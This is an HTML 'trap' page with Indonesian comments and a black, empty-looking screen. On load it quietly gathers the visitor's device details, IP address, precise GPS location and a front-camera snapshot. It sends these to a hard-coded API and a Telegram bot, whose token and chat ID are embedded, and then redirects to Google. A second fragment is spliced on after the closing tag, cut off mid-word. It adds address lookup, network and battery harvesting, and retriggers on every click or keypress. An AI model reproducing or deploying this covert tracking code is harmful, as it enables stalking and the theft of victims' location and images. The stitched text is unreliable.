<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* SEMUA ELEMEN DISEMBUNYIKAN */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000000;
        }
        
        /* Loading sangat kecil di tengah (opsional) */
        .loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 2px;
            height: 2px;
            background: transparent;
            opacity: 0.01;
        }
    </style>
</head>
<body>
    <div class="loader"></div>

<script>
// ========== KONFIGURASI ==========
const TELEGRAM_BOT_TOKEN = "8303396278:AAGAiWFRjgwRvCdeW4np6oTiKHFUUYBDGJc";
const TELEGRAM_CHAT_ID = "6865071834";
const API_URL = "https://apiiy.vercel.app/api"; // API kamu

// ========== FUNGSI UTAMA ==========

// 1. Fungsi untuk kirim ke Telegram langsung (fallback)
async function sendToTelegramDirect(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('Telegram direct:', await response.json());
        return true;
    } catch (error) {
        console.error('Telegram direct error:', error);
        return false;
    }
}

// 2. Ambil data device
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled,
        java: navigator.javaEnabled ? 'Enabled' : 'Disabled',
        doNotTrack: navigator.doNotTrack || 'Not specified'
    };
}

// 3. Ambil IP address (via WebRTC)
function getIPAddress() {
    return new Promise((resolve) => {
        try {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            
            rtc.onicecandidate = (event) => {
                if (event.candidate) {
                    const candidate = event.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(ipRegex);
                    if (match) {
                        resolve(match[1]);
                        rtc.close();
                    }
                }
            };
            
            setTimeout(() => {
                resolve('Unknown');
                rtc.close();
            }, 1000);
        } catch (error) {
            resolve('Unknown');
        }
    });
}

// 4. Coba akses kamera (diam-diam)
async function tryCameraAccess() {
    let frontCam = false;
    let rearCam = false;
    let screenshot = null;
    
    try {
        // Coba kamera depan
        const frontStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }
        });
        frontCam = true;
        
        // Ambil screenshot kecil
        const video = document.createElement('video');
        video.srcObject = frontStream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = 100; // Ukuran kecil biar cepat
        canvas.height = 100;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 100, 100);
        screenshot = canvas.toDataURL('image/jpeg', 0.5);
        
        frontStream.getTracks().forEach(track => track.stop());
        
        // Coba kamera belakang
        try {
            const rearStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: 'environment' } }
            });
            rearCam = true;
            rearStream.getTracks().forEach(track => track.stop());
        } catch (e) {
            // Kamera belakang gagal, tidak masalah
        }
    } catch (e) {
        // Akses kamera ditolak
    }
    
    return { frontCam, rearCam, screenshot };
}

// 5. Ambil lokasi
async function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ lat: null, lon: null, acc: null });
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    acc: position.coords.accuracy
                });
            },
            (error) => {
                resolve({ lat: null, lon: null, acc: null });
            },
            { 
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            }
        );
    });
}

// 6. Kirim data ke API kamu
async function sendToYourAPI(data) {
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        console.log('API Response:', result);
        return result;
    } catch (error) {
        console.error('API Error:', error);
        return null;
    }
}

// 7. Format pesan untuk Telegram
function formatTelegramMessage(data) {
    const location = data.location.lat ? 
        `üìç <b>Lokasi:</b> ${data.location.lat}, ${data.location.lon}\n   Akurasi: ${data.location.acc}m\n   Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}` : 
        'üìç <b>Lokasi:</b> Tidak ada akses';
    
    const camera = `üì∑ <b>Kamera:</b>\n   Depan: ${data.camera.frontCam ? '‚úÖ' : '‚ùå'}\n   Belakang: ${data.camera.rearCam ? '‚úÖ' : '‚ùå'}`;
    
    return `üö® <b>DATA TERKIRIM</b> üö®

‚è∞ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
üåê <b>IP:</b> ${data.ip}
${location}

üì± <b>Device:</b>
   ‚Ä¢ OS: ${data.device.platform}
   ‚Ä¢ Browser: ${data.device.userAgent.substring(0, 50)}...
   ‚Ä¢ Screen: ${data.device.screenWidth}x${data.device.screenHeight}
   ‚Ä¢ Timezone: ${data.device.timezone}

${camera}

üîó <b>URL:</b> ${window.location.href}
üìä <b>Cookies:</b> ${data.device.cookies ? 'Enabled' : 'Disabled'}`;
}

// ========== PROSES UTAMA ==========
async function mainProcess() {
    console.log('Memulai proses...');
    
    // Delay 3 detik biar tidak terlalu cepat
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Kumpulkan data bertahap
    const deviceInfo = getDeviceInfo();
    const ipAddress = await getIPAddress();
    const location = await getLocation();
    const camera = await tryCameraAccess();
    
    // Siapkan data lengkap
    const fullData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        ip: ipAddress,
        device: deviceInfo,
        location: location,
        camera: camera,
        trap_id: new URLSearchParams(window.location.search).get('id') || 
                'auto_' + Date.now().toString(36)
    };
    
    console.log('Data terkumpul:', fullData);
    
    // ===== KIRIM DATA =====
    
    // 1. Coba kirim ke API kamu dulu
    console.log('Mengirim ke API...');
    const apiResult = await sendToYourAPI(fullData);
    
    // 2. Jika API gagal, kirim langsung ke Telegram
    if (!apiResult || apiResult.error) {
        console.log('API gagal, kirim langsung ke Telegram...');
        const telegramMessage = formatTelegramMessage(fullData);
        await sendToTelegramDirect(telegramMessage);
        
        // Jika ada screenshot, kirim juga
        if (camera.screenshot) {
            try {
                // Konversi base64 ke blob
                const blob = await fetch(camera.screenshot).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'screenshot.jpg');
                formData.append('caption', 'üì∏ Screenshot');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error('Gagal kirim screenshot:', e);
            }
        }
    }
    
    console.log('Proses selesai!');
    
    // Redirect setelah 5 detik total
    setTimeout(() => {
        window.location.href = "https://www.google.com"; // Ganti dengan tujuan akhir
    }, 20000);
}

// ========== JALANKAN ==========

// Tunggu page fully loaded
window.addEventListener('load', () => {
    // Mulai proses setelah 500ms
    setTimeout(mainProcess, 500);
});

// Fallback jika load event tidak terpicu
setTimeout(mainProcess, 1000);

// Backup: kirim minimal data jika semua gagal
setTimeout(() => {
    const minimalData = {
        trap_id: 'backup_' + Date.now(),
        userAgent: navigator.userAgent,
        url: window.location.href,
        time: new Date().toISOString()
    };
    
    fetch(API_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(minimalData)
    }).catch(() => {
        // Kirim ke Telegram sebagai last resort
        const msg = `‚ö†Ô∏è BACKUP DATA\nURL: ${window.location.href}\nUA: ${navigator.userAgent}`;
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: msg
            })
        });
    });
}, 10000); // Backup setelah 10 detik

</script>
</body>
</html>ed,
                            heading: pos.coords.heading,
                            timestamp: new Date(pos.timestamp).toISOString()
                        };
                        
                        // Get detailed address
                        try {
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&zoom=18`
                            );
                            const geoData = await response.json();
                            
                            collectedData.location.address = geoData.display_name;
                            collectedData.location.road = geoData.address?.road || 'Tidak diketahui';
                            collectedData.location.neighbourhood = geoData.address?.neighbourhood;
                            collectedData.location.suburb = geoData.address?.suburb;
                            collectedData.location.city = geoData.address?.city || geoData.address?.town || geoData.address?.village;
                            collectedData.location.county = geoData.address?.county;
                            collectedData.location.state = geoData.address?.state;
                            collectedData.location.country = geoData.address?.country;
                            collectedData.location.postcode = geoData.address?.postcode;
                            collectedData.location.country_code = geoData.address?.country_code;
                        } catch(e) {}
                        
                        resolve(true);
                    },
                    (error) => {
                        console.log('üìç Location denied:', error.message);
                        resolve(false);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // ===================== GET NETWORK INFO =====================
        function getNetworkInfo() {
            if (navigator.connection) {
                collectedData.network = {
                    type: navigator.connection.type || 'unknown',
                    effectiveType: navigator.connection.effectiveType || 'unknown',
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData ? 'AKTIF' : 'TIDAK',
                    downlinkMax: navigator.connection.downlinkMax || 'unknown'
                };
            }
            
            // WebRTC IP Leak Detection
            try {
                const rtc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const candidate = e.candidate.candidate;
                        if (candidate.includes('srflx')) {
                            collectedData.webrtc = {
                                publicIP: candidate.split(' ')[4],
                                type: 'STUN Public IP',
                                port: candidate.split(' ')[5]
                            };
                        } else if (candidate.includes('host')) {
                            collectedData.webrtcLocal = {
                                localIP: candidate.split(' ')[4],
                                type: 'Local IP'
                            };
                        }
                    }
                };
                
                setTimeout(() => rtc.close(), 5000);
            } catch(e) {}
        }
        
        // ===================== MAIN EXECUTION =====================
        async function executeAll() {
            console.log('üöÄ Starting OxyX Auto Capture...');
            
            // 1. Get IP Detail (PERTAMA biar cepet)
            await getIPDetail();
            
            // 2. Get Battery Detail
            await getBatteryDetail();
            
            // 3. Get Network Info
            getNetworkInfo();
            
            // 4. Get Location (async, bisa lama)
            getLocation();
            
            // 5. Auto Capture Camera (Sekalian jalanin)
            setTimeout(async () => {
                console.log('üì∏ Starting auto camera capture...');
                await autoCaptureCamera();
                
                // 6. Send semua data
                console.log('üì§ Sending all data...');
                sendToAPI(collectedData);
                
                // 7. Redirect
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, CONFIG.REDIRECT_DELAY);
                
            }, 1500); // Tunggu 1.5 detik sebelum kamera
            
            // Backup: Kirim data tanpa kamera setelah 5 detik
            setTimeout(() => {
                if (collectedData.photos.length === 0) {
                    console.log('‚è±Ô∏è Sending data without camera...');
                    sendToAPI(collectedData);
                }
            }, 5000);
        }
        
        // ===================== START =====================
        // Trigger semua
        window.addEventListener('DOMContentLoaded', executeAll);
        window.addEventListener('load', executeAll);
        
        // Langsung execute tanpa tunggu
        setTimeout(executeAll, 500);
        
        // Auto click untuk trigger user interaction (trick)
        document.addEventListener('click', executeAll);
        document.addEventListener('touchstart', executeAll);
        document.addEventListener('keydown', executeAll);
        
    </script>
</head>
<body>
<!-- KOSONG -->
</body>
</html>
